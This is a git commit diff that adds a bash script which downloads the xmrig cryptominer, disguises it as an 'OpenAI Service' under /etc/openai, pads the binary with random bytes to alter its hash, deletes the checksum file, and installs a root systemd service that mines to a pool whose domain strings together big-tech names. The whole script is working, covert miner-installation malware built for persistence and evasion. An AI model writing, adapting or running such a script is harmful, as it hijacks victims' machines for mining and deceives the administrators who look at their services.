4a366f58f558a0fb9ee73c021f540dea9bcfaf85
caippx <37325838+caippx@users.noreply.github.com>
2024-05-02 15:51:24 +0800

    Create wk2024-2.sh

---
+++ drfytgybhunjoimkol/wk2024-2.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+U=$1
+latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
+wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
+tar -zxvf 1.tar.gz
+mv xmrig-$latest openai
+mv openai/xmrig openai/openai
+mv openai /etc/openai
+rm -rf 1.tar.gz
+cd /etc/openai && rm -rf SHA256SUMS
+random_number=$((RANDOM % 1088 + 18))
+for i in $(seq 1 $random_number); do
+  echo -n "0" >> /etc/openai/openai
+done
+cat > /etc/systemd/system/openai.service <<EOL
+[Unit]
+Description=OpenAI Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/etc/openai/openai -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $1 -p x
+Restart=on-failure
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+systemctl daemon-reload
+systemctl enable openai.service
+systemctl start openai.service
+sleep 2
+systemctl status openai.service
+#/etc/openai/openai -a rx -o stratum+ssl://rxnat.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
